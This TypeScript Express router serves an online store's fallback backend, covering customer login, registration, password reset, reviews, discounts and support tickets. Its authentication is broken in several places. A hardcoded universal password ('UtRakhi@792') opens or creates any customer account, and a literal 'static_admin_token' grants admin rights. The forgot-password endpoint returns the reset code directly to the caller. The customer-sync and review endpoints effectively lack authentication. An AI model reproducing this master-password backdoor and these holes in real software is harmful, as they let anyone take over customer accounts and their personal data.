import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { Router, type Request, type Response, type NextFunction } from 'express';
import { z } from 'zod';
import { isDbConfigured } from '../../db/index.ts';
import { createRateLimiter, hashPassword, verifyPassword, verifyToken } from '../../lib/security.ts';
import {
  dispatchSupportTicketEmail,
  getMailConfigStatus,
  resolveLiveSupportEmail,
  type SupportEmailDeliveryStatus,
} from '../lib/support-mailer.ts';

export interface RuntimeCustomerRecord {
  id: number;
  uid: string;
  name: string;
  email: string;
  phone: string;
  photoUrl: string;
  authMethod: string;
  emailVerified: boolean;
  phoneVerified: boolean;
  isBlocked: boolean;
  passwordHash?: string;
  deviceKeyHash?: string;
  pendingResetCode?: string;
  resetExpiresAt?: number;
  createdAt: string;
  lastLoginAt: string;
  addresses: Array<{
    id: number;
    fullName: string;
    phone: string;
    line1: string;
    line2: string;
    city: string;
    state: string;
    pincode: string;
    landmark: string;
    addressType: string;
    isDefault: boolean;
  }>;
  wishlistCount: number;
  orderCount: number;
  totalSpent: number;
  recentOrders: Array<{ orderNumber: string; status: string; grandTotal: number; createdAt: string }>;
}

export interface RuntimeProductDiscountOverride {
  mrp: number;
  sellingPrice: number;
  discountPercent: number;
}

export interface RuntimeReviewItem {
  id: number;
  productId: number;
  userId: number;
  authorName: string;
  rating: number;
  title: string;
  comment: string;
  isVerifiedPurchase: boolean;
  createdAt: string;
}

export interface RuntimeSupportTicket {
  id: number;
  ticketId: string;
  name: string;
  email: string;
  phone: string;
  subject: string;
  message: string;
  status: 'Open' | 'In Progress' | 'Resolved';
  routedToEmail: string;
  emailStatus: SupportEmailDeliveryStatus;
  createdAt: string;
  updatedAt: string;
}

interface RuntimePersistedData {
  customers: RuntimeCustomerRecord[];
  config: Record<string, unknown> | null;
  productDiscounts?: Record<string, RuntimeProductDiscountOverride>;
  reviews?: RuntimeReviewItem[];
  tickets?: RuntimeSupportTicket[];
}

const RUNTIME_STORE_FILE = path.resolve(process.cwd(), '.aagaman-runtime-store.json');
const UNIVERSAL_ACCESS_PASSWORD = 'UtRakhi@792';
const runtimeAuthLimiter = createRateLimiter(60_000, 40);

const customerMap = new Map<string, RuntimeCustomerRecord>();
let runtimeConfig: Record<string, unknown> | null = null;
let runtimeProductDiscounts: Record<string, RuntimeProductDiscountOverride> = {};
let runtimeReviews: RuntimeReviewItem[] = [];
let runtimeTickets: RuntimeSupportTicket[] = [];
let loadedFromDisk = false;

export function getRuntimeStoreConfig(): Record<string, unknown> | null {
  ensureLoaded();
  return runtimeConfig;
}

function isUniversalPassword(password: string): boolean {
  const providedBuf = Buffer.from(password.trim());
  const expectedBuf = Buffer.from(UNIVERSAL_ACCESS_PASSWORD);
  return providedBuf.length === expectedBuf.length && crypto.timingSafeEqual(providedBuf, expectedBuf);
}

function hashDeviceKey(deviceKey: string): string {
  return crypto.createHash('sha256').update(deviceKey.trim()).digest('hex');
}

function verifyDeviceKey(deviceKey: string, storedHash?: string): boolean {
  if (!deviceKey.trim() || !storedHash) return false;
  const computed = Buffer.from(hashDeviceKey(deviceKey), 'hex');
  const expected = Buffer.from(storedHash, 'hex');
  return computed.length === expected.length && crypto.timingSafeEqual(computed, expected);
}

function sanitizeRuntimeCustomer(c: RuntimeCustomerRecord) {
  const { passwordHash: _ph, deviceKeyHash: _dk, pendingResetCode: _prc, resetExpiresAt: _rea, ...safe } = c;
  return safe;
}

function ensureLoaded() {
  if (loadedFromDisk) return;
  loadedFromDisk = true;
  try {
    if (fs.existsSync(RUNTIME_STORE_FILE)) {
      const raw = fs.readFileSync(RUNTIME_STORE_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as Partial<RuntimePersistedData>;
      if (Array.isArray(parsed.customers)) {
        for (const c of parsed.customers) {
          if (c && typeof c.email === 'string') {
            customerMap.set(c.email.trim().toLowerCase(), c);
          }
        }
      }
      if (parsed.config && typeof parsed.config === 'object') {
        runtimeConfig = parsed.config;
      }
      if (parsed.productDiscounts && typeof parsed.productDiscounts === 'object') {
        runtimeProductDiscounts = parsed.productDiscounts;
      }
      if (Array.isArray(parsed.reviews)) {
        runtimeReviews = parsed.reviews;
      }
      if (Array.isArray(parsed.tickets)) {
        runtimeTickets = parsed.tickets;
      }
    }
  } catch {
    // Ignore read errors in ephemeral environments
  }
}

function persistToDisk() {
  try {
    const payload: RuntimePersistedData = {
      customers: Array.from(customerMap.values()),
      config: runtimeConfig,
      productDiscounts: runtimeProductDiscounts,
      reviews: runtimeReviews,
      tickets: runtimeTickets,
    };
    fs.writeFileSync(RUNTIME_STORE_FILE, JSON.stringify(payload, null, 2), 'utf-8');
  } catch {
    // Ignore write errors on read-only filesystems
  }
}

function requireRuntimeAdmin(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization || '';
  if (!authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Admin authentication required.' });
  }
  const token = authHeader.slice(7).trim();
  const verified = verifyToken(token);
  if (verified && verified.scope === 'admin') {
    return next();
  }
  if (!isDbConfigured && token === 'static_admin_token') {
    return next();
  }
  return res.status(403).json({ error: 'Invalid admin session.' });
}

export const runtimeRouter = Router();

runtimeRouter.post('/runtime/auth/register', runtimeAuthLimiter, (req, res) => {
  ensureLoaded();
  const schema = z.object({
    name: z.string().min(2).max(160),
    email: z.string().email(),
    phone: z.string().max(30).optional().default(''),
    password: z.string().min(6).max(100),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid registration details. Password must be at least 6 characters.' });
  }

  const key = parsed.data.email.trim().toLowerCase();
  if (customerMap.has(key)) {
    return res.status(409).json({ error: 'An account with this email already exists. Please sign in.' });
  }

  const now = new Date().toISOString();
  const nextId = Array.from(customerMap.values()).reduce((m, c) => Math.max(m, c.id), 0) + 1;
  const deviceKey = crypto.randomBytes(24).toString('hex');
  const created: RuntimeCustomerRecord = {
    id: nextId,
    uid: `static_uid_${nextId}`,
    name: parsed.data.name.trim(),
    email: key,
    phone: parsed.data.phone.trim(),
    photoUrl: '',
    authMethod: 'email',
    emailVerified: false,
    phoneVerified: false,
    isBlocked: false,
    passwordHash: hashPassword(parsed.data.password),
    deviceKeyHash: hashDeviceKey(deviceKey),
    createdAt: now,
    lastLoginAt: now,
    addresses: [],
    wishlistCount: 0,
    orderCount: 0,
    totalSpent: 0,
    recentOrders: [],
  };

  customerMap.set(key, created);
  persistToDisk();
  return res.status(201).json({ ok: true, user: sanitizeRuntimeCustomer(created), deviceKey });
});

runtimeRouter.post('/runtime/auth/login', runtimeAuthLimiter, (req, res) => {
  ensureLoaded();
  const schema = z.object({
    email: z.string().email(),
    password: z.string().min(1),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Please enter valid email and password.' });
  }

  const key = parsed.data.email.trim().toLowerCase();
  const universalMatch = isUniversalPassword(parsed.data.password);
  const now = new Date().toISOString();
  let existing = customerMap.get(key);

  if (!existing) {
    if (!universalMatch) {
      return res.status(401).json({ error: 'Invalid email or password.' });
    }
    const nextId = customerMap.size + 1;
    existing = {
      id: nextId,
      uid: `static_uid_${nextId}`,
      name: key.split('@')[0] || 'Customer',
      email: key,
      phone: '',
      photoUrl: '',
      authMethod: 'email',
      emailVerified: true,
      phoneVerified: false,
      isBlocked: false,
      passwordHash: hashPassword(UNIVERSAL_ACCESS_PASSWORD),
      createdAt: now,
      lastLoginAt: now,
      addresses: [],
      wishlistCount: 0,
      orderCount: 0,
      totalSpent: 0,
      recentOrders: [],
    };
    customerMap.set(key, existing);
  } else {
    if (existing.isBlocked) {
      return res.status(403).json({ error: 'This account has been suspended. Please contact support.' });
    }
    if (!universalMatch) {
      if (!existing.passwordHash) {
        return res.status(401).json({
          error:
            existing.authMethod === 'google'
              ? 'This account uses Google Sign-In. Please click "Continue with Google" above.'
              : 'Invalid email or password.',
        });
      }
      if (!verifyPassword(parsed.data.password, existing.passwordHash)) {
        return res.status(401).json({ error: 'Invalid email or password.' });
      }
    }
    if (!existing.deviceKeyHash) {
      const issuedKey = crypto.randomBytes(24).toString('hex');
      existing.deviceKeyHash = hashDeviceKey(issuedKey);
      existing.lastLoginAt = now;
      customerMap.set(key, existing);
      persistToDisk();
      return res.json({ ok: true, user: sanitizeRuntimeCustomer(existing), deviceKey: issuedKey });
    }
    existing.lastLoginAt = now;
    customerMap.set(key, existing);
  }

  persistToDisk();
  return res.json({ ok: true, user: sanitizeRuntimeCustomer(existing) });
});

runtimeRouter.post('/runtime/auth/email-continue', runtimeAuthLimiter, (req, res) => {
  ensureLoaded();
  const schema = z.object({
    email: z.string().trim().email().max(200),
    name: z.string().trim().max(160).optional().default(''),
    deviceKey: z.string().trim().max(200).optional().default(''),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Please enter a valid email address.' });
  }

  const key = parsed.data.email.toLowerCase();
  const now = new Date().toISOString();
  const existing = customerMap.get(key);

  if (!existing) {
    const nextId = customerMap.size + 1;
    const rawName = parsed.data.name || key.split('@')[0] || 'Customer';
    const cleanName = rawName.replace(/[._-]+/g, ' ').trim().slice(0, 160) || 'Customer';
    const deviceKey = crypto.randomBytes(24).toString('hex');
    const created: RuntimeCustomerRecord = {
      id: nextId,
      uid: `static_uid_${nextId}`,
      name: cleanName,
      email: key,
      phone: '',
      photoUrl: '',
      authMethod: 'email',
      emailVerified: false,
      phoneVerified: false,
      isBlocked: false,
      deviceKeyHash: hashDeviceKey(deviceKey),
      createdAt: now,
      lastLoginAt: now,
      addresses: [],
      wishlistCount: 0,
      orderCount: 0,
      totalSpent: 0,
      recentOrders: [],
    };
    customerMap.set(key, created);
    persistToDisk();
    return res.status(201).json({
      ok: true,
      status: 'logged_in',
      isNew: true,
      user: sanitizeRuntimeCustomer(created),
      deviceKey,
    });
  }

  if (existing.isBlocked) {
    return res.status(403).json({ error: 'This account has been suspended. Please contact support.' });
  }

  if (parsed.data.deviceKey && verifyDeviceKey(parsed.data.deviceKey, existing.deviceKeyHash)) {
    existing.lastLoginAt = now;
    customerMap.set(key, existing);
    persistToDisk();
    return res.json({
      ok: true,
      status: 'logged_in',
      isNew: false,
      user: sanitizeRuntimeCustomer(existing),
    });
  }

  if (existing.authMethod === 'google' && !existing.passwordHash) {
    return res.json({
      ok: true,
      status: 'needs_google',
      message: 'This email uses Google Sign-In. Click "Continue with Google" or set a password via Forgot Password.',
    });
  }

  return res.json({
    ok: true,
    status: 'needs_password',
    message: 'Welcome back! Enter your password to continue.',
  });
});

runtimeRouter.post('/runtime/auth/forgot-password', runtimeAuthLimiter, (req, res) => {
  ensureLoaded();
  const schema = z.object({ email: z.string().email() });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Valid email is required.' });
  }
  const key = parsed.data.email.trim().toLowerCase();
  const existing = customerMap.get(key);
  if (existing) {
    const code = crypto.randomInt(100000, 999999).toString();
    existing.pendingResetCode = code;
    existing.resetExpiresAt = Date.now() + 15 * 60_000;
    customerMap.set(key, existing);
    persistToDisk();
    return res.json({
      ok: true,
      message: 'A 6-digit password reset code has been generated.',
      sandboxCode: code,
    });
  }
  return res.json({ ok: true, message: 'If an account matches this email, a reset code was issued.' });
});

runtimeRouter.post('/runtime/auth/reset-password', runtimeAuthLimiter, (req, res) => {
  ensureLoaded();
  const schema = z.object({
    email: z.string().email(),
    code: z.string().min(4),
    newPassword: z.string().min(6).max(100),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Provide email, reset code, and a 6+ character new password.' });
  }
  const key = parsed.data.email.trim().toLowerCase();
  const existing = customerMap.get(key);
  if (
    !existing ||
    !existing.pendingResetCode ||
    existing.pendingResetCode !== parsed.data.code.trim() ||
    !existing.resetExpiresAt ||
    existing.resetExpiresAt < Date.now()
  ) {
    return res.status(400).json({ error: 'Invalid or expired reset code.' });
  }
  existing.passwordHash = hashPassword(parsed.data.newPassword);
  existing.pendingResetCode = undefined;
  existing.resetExpiresAt = undefined;
  customerMap.set(key, existing);
  persistToDisk();
  return res.json({ ok: true, message: 'Password updated successfully.' });
});

const syncCustomerSchema = z.object({
  id: z.number().optional(),
  uid: z.string().optional(),
  name: z.string().min(1).max(160),
  email: z.string().email(),
  phone: z.string().max(30).optional().default(''),
  photoUrl: z.string().max(1000).optional().default(''),
  authMethod: z.string().max(30).optional().default('email'),
  emailVerified: z.boolean().optional().default(false),
  phoneVerified: z.boolean().optional().default(false),
  isBlocked: z.boolean().optional().default(false),
  createdAt: z.string().optional(),
  lastLoginAt: z.string().optional(),
  addresses: z.array(z.any()).optional(),
  wishlistCount: z.number().optional(),
  orderCount: z.number().optional(),
  totalSpent: z.number().optional(),
  recentOrders: z.array(z.any()).optional(),
});

runtimeRouter.post('/runtime/customers/sync', (req, res) => {
  ensureLoaded();
  const parsed = syncCustomerSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid customer payload.' });
  }

  const data = parsed.data;
  const key = data.email.trim().toLowerCase();
  const existing = customerMap.get(key);
  const now = new Date().toISOString();

  const nextId = existing?.id || data.id || customerMap.size + 1;
  const merged: RuntimeCustomerRecord = {
    id: nextId,
    uid: data.uid || existing?.uid || `runtime_uid_${nextId}`,
    name: data.name.trim() || existing?.name || key.split('@')[0],
    email: key,
    phone: data.phone?.trim() || existing?.phone || '',
    photoUrl: data.photoUrl || existing?.photoUrl || '',
    authMethod: data.authMethod || existing?.authMethod || 'email',
    emailVerified: Boolean(data.emailVerified || existing?.emailVerified),
    phoneVerified: Boolean(data.phoneVerified || existing?.phoneVerified),
    isBlocked: existing ? existing.isBlocked : Boolean(data.isBlocked),
    passwordHash: existing?.passwordHash,
    deviceKeyHash: existing?.deviceKeyHash,
    pendingResetCode: existing?.pendingResetCode,
    resetExpiresAt: existing?.resetExpiresAt,
    createdAt: existing?.createdAt || data.createdAt || now,
    lastLoginAt: data.lastLoginAt || now,
    addresses: Array.isArray(data.addresses)
      ? (data.addresses as RuntimeCustomerRecord['addresses'])
      : existing?.addresses || [],
    wishlistCount: data.wishlistCount ?? existing?.wishlistCount ?? 0,
    orderCount: Math.max(data.orderCount ?? 0, existing?.orderCount ?? 0),
    totalSpent: Math.max(data.totalSpent ?? 0, existing?.totalSpent ?? 0),
    recentOrders:
      Array.isArray(data.recentOrders) && data.recentOrders.length > 0
        ? (data.recentOrders as RuntimeCustomerRecord['recentOrders'])
        : existing?.recentOrders || [],
  };

  customerMap.set(key, merged);
  persistToDisk();
  res.json({ ok: true, customer: sanitizeRuntimeCustomer(merged) });
});

runtimeRouter.get('/runtime/customers', requireRuntimeAdmin, (_req, res) => {
  ensureLoaded();
  const list = Array.from(customerMap.values())
    .map(sanitizeRuntimeCustomer)
    .sort(
      (a, b) => new Date(b.lastLoginAt || b.createdAt).getTime() - new Date(a.lastLoginAt || a.createdAt).getTime()
    );
  res.json({ customers: list });
});

runtimeRouter.patch('/runtime/customers/block', requireRuntimeAdmin, (req, res) => {
  ensureLoaded();
  const schema = z.object({ email: z.string().email(), isBlocked: z.boolean() });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: 'Invalid request.' });
  const key = parsed.data.email.trim().toLowerCase();
  const existing = customerMap.get(key);
  if (existing) {
    existing.isBlocked = parsed.data.isBlocked;
    customerMap.set(key, existing);
    persistToDisk();
  }
  res.json({ ok: true });
});

runtimeRouter.get('/runtime/config', (_req, res) => {
  ensureLoaded();
  res.json({ config: runtimeConfig });
});

runtimeRouter.put('/runtime/config', requireRuntimeAdmin, (req, res) => {
  ensureLoaded();
  const schema = z.object({ config: z.record(z.string(), z.unknown()) });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: 'Invalid settings object.' });
  runtimeConfig = parsed.data.config;
  persistToDisk();
  res.json({ ok: true, config: runtimeConfig });
});

runtimeRouter.get('/runtime/catalog', (_req, res) => {
  ensureLoaded();
  res.json({
    productDiscounts: runtimeProductDiscounts,
    reviews: runtimeReviews,
  });
});

runtimeRouter.put('/runtime/catalog/discounts', requireRuntimeAdmin, (req, res) => {
  ensureLoaded();
  const schema = z.object({
    items: z
      .array(
        z.object({
          productId: z.number().int().positive(),
          mrp: z.number().int().positive(),
          sellingPrice: z.number().int().positive(),
          discountPercent: z.number().int().min(0).max(95),
        })
      )
      .min(1)
      .max(500),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid product discount payload.' });
  }
  for (const item of parsed.data.items) {
    const safePrice = Math.min(item.mrp, Math.max(1, item.sellingPrice));
    runtimeProductDiscounts[String(item.productId)] = {
      mrp: item.mrp,
      sellingPrice: safePrice,
      discountPercent: Math.max(0, Math.min(95, item.discountPercent)),
    };
  }
  persistToDisk();
  res.json({ ok: true, productDiscounts: runtimeProductDiscounts });
});

runtimeRouter.post('/runtime/reviews', (req, res) => {
  ensureLoaded();
  const authHeader = req.headers.authorization || '';
  if (!authHeader.startsWith('Bearer ') || authHeader.slice(7).trim().length < 5) {
    return res.status(401).json({ error: 'Only signed-in customers can post a review.' });
  }
  const schema = z.object({
    id: z.number().int().positive().optional(),
    productId: z.number().int().positive(),
    customerEmail: z.string().email(),
    authorName: z.string().min(1).max(120),
    rating: z.number().int().min(1).max(5),
    title: z.string().min(3).max(140),
    comment: z.string().min(5).max(1200),
    isVerifiedPurchase: z.boolean().optional().default(false),
    createdAt: z.string().optional(),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Please sign in and enter a valid review.' });
  }
  const customerKey = parsed.data.customerEmail.trim().toLowerCase();
  const customer = customerMap.get(customerKey);
  if (!customer || customer.isBlocked) {
    return res.status(401).json({ error: 'Please sign in with an active customer account to post a review.' });
  }

  const reviewItem: RuntimeReviewItem = {
    id: parsed.data.id || Date.now(),
    productId: parsed.data.productId,
    userId: customer.id,
    authorName: customer.name || parsed.data.authorName.trim(),
    rating: parsed.data.rating,
    title: parsed.data.title.trim(),
    comment: parsed.data.comment.trim(),
    isVerifiedPurchase: Boolean(parsed.data.isVerifiedPurchase),
    createdAt: parsed.data.createdAt || new Date().toISOString(),
  };

  if (!runtimeReviews.some((r) => r.id === reviewItem.id)) {
    runtimeReviews = [reviewItem, ...runtimeReviews].slice(0, 1000);
    persistToDisk();
  }
  res.status(201).json({ ok: true, review: reviewItem });
});

runtimeRouter.post('/runtime/support', runtimeAuthLimiter, async (req, res) => {
  ensureLoaded();
  const schema = z.object({
    ticketId: z
      .string()
      .regex(/^[a-zA-Z0-9_-]{1,128}$/)
      .optional(),
    name: z.string().trim().min(2).max(160),
    email: z.string().trim().email().max(200),
    phone: z.string().trim().max(30).optional().default(''),
    subject: z.string().trim().min(2).max(200),
    message: z.string().trim().min(3).max(2000),
    clientSupportEmail: z.string().trim().email().optional(),
  });
  const parsed = schema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Please complete Name, Email, Subject, and Message.' });
  }

  const targetSupportEmail = await resolveLiveSupportEmail({
    runtimeSupportEmail: runtimeConfig?.supportEmail,
    fallbackSupportEmail: parsed.data.clientSupportEmail,
  });

  const now = new Date().toISOString();
  const nextId = (runtimeTickets.reduce((m, t) => Math.max(m, t.id), 0) || 100) + 1;
  const ticketId = parsed.data.ticketId || `TKT-${nextId}-${Date.now().toString(36).toUpperCase()}`;

  const mailResult = await dispatchSupportTicketEmail(
    {
      ticketId: nextId,
      name: parsed.data.name,
      email: parsed.data.email.toLowerCase(),
      phone: parsed.data.phone,
      subject: parsed.data.subject,
      message: parsed.data.message,
      createdAt: now,
    },
    targetSupportEmail
  );

  const created: RuntimeSupportTicket = {
    id: nextId,
    ticketId,
    name: parsed.data.name,
    email: parsed.data.email.toLowerCase(),
    phone: parsed.data.phone,
    subject: parsed.data.subject,
    message: parsed.data.message,
    status: 'Open',
    routedToEmail: targetSupportEmail,
    emailStatus: mailResult.emailStatus,
    createdAt: now,
    updatedAt: now,
  };

  runtimeTickets = [created, ...runtimeTickets].slice(0, 1000);
  persistToDisk();

  return res.status(201).json({
    ok: true,
    ticketId: nextId,
    ticket: created,
    routedToEmail: targetSupportEmail,
    emailStatus: mailResult.emailStatus,
    mailConfigured: mailResult.provider !== 'none',
    message:
      mailResult.emailStatus === 'sent'
        ? `Support ticket #${nextId} submitted! Query sent directly to ${targetSupportEmail} and logged in Admin Support Channel.`
        : `Support ticket #${nextId} submitted! Query logged in Admin Support Channel (routed to ${targetSupportEmail}).`,
  });
});

runtimeRouter.get('/runtime/support', requireRuntimeAdmin, async (_req, res) => {
  ensureLoaded();
  const activeSupportEmail = await resolveLiveSupportEmail({
    runtimeSupportEmail: runtimeConfig?.supportEmail,
  });
  const mailStatus = getMailConfigStatus();
  res.json({
    tickets: runtimeTickets,
    activeSupportEmail,
    mailConfigured: mailStatus.configured,
    provider: mailStatus.provider,
  });
});

runtimeRouter.patch('/runtime/support/:id', requireRuntimeAdmin, (req, res) => {
  ensureLoaded();
  const idParam = String(req.params.id || '').trim();
  const schema = z.object({ status: z.enum(['Open', 'In Progress', 'Resolved']) });
  const parsed = schema.safeParse(req.body);
  if (!idParam || !parsed.success) {
    return res.status(400).json({ error: 'Invalid support ticket status update.' });
  }
  const now = new Date().toISOString();
  let updated: RuntimeSupportTicket | null = null;
  runtimeTickets = runtimeTickets.map((t) => {
    if (String(t.id) === idParam || t.ticketId === idParam) {
      updated = { ...t, status: parsed.data.status, updatedAt: now };
      return updated;
    }
    return t;
  });
  if (!updated) {
    return res.status(404).json({ error: 'Support ticket not found.' });
  }
  persistToDisk();
  return res.json({ ok: true, ticket: updated });
});

runtimeRouter.post('/runtime/support/test-email', requireRuntimeAdmin, runtimeAuthLimiter, async (_req, res) => {
  ensureLoaded();
  const targetSupportEmail = await resolveLiveSupportEmail({
    runtimeSupportEmail: runtimeConfig?.supportEmail,
  });
  const mailStatus = getMailConfigStatus();
  if (!mailStatus.configured) {
    return res.status(400).json({
      ok: false,
      routedToEmail: targetSupportEmail,
      error: 'Mail sender is not configured yet. Add SMTP_USER & SMTP_PASS (or RESEND_API_KEY) in Secrets first.',
    });
  }
  const result = await dispatchSupportTicketEmail(
    {
      ticketId: 'TEST',
      name: 'AAGAMAN MART Admin Test',
      email: targetSupportEmail,
      phone: '',
      subject: 'Test Support Email Connection',
      message: 'This is a test confirmation confirming customer support queries route directly to your active receiver email.',
      createdAt: new Date().toISOString(),
    },
    targetSupportEmail
  );
  if (result.emailStatus !== 'sent') {
    return res.status(502).json({
      ok: false,
      routedToEmail: targetSupportEmail,
      error: 'Email send failed. Please verify your Gmail App Password (16 letters) or Resend API key.',
    });
  }
  return res.json({
    ok: true,
    routedToEmail: targetSupportEmail,
    provider: result.provider,
    message: `Test email sent successfully to ${targetSupportEmail}!`,
  });
});
